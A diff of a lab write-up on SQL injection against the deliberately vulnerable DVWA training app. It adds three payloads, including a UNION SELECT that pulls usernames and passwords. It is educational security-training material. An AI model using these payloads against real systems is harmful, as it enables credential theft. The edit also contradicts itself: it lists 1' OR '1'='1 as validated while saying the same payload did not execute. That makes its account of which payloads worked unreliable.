@@ -97,14 +97,21 @@ This flow mirrors how SOC analysts reconstruct web-based intrusion attempts.
 ### Authentication Bypass (Primary Scenario)
 
 * DVWA security level: **Low**
-* Payload example:
+* Payloads validated during this simulation:
+
 ```sql
-1 OR 1=1#
+1' OR '1'='1
+```
+```sql
+1' OR 1=1-- -
+```
+```sql
+1' UNION SELECT user, password FROM users-- -
 ```
 
-This payload exploits numeric input handling and SQL comment behavior, resulting in multiple database records being returned.
+These payloads successfully altered backend query logic and returned multiple records, confirming SQL injection execution in a string-based query context.
 
-> Earlier textbook payloads (' OR '1'='1) did not execute due to application context and security level state.
+> Earlier textbook payloads (1' OR '1'='1) did not execute due to application context and security level state.
 
 This method was selected because it:
 - Worked reliably in the actual lab
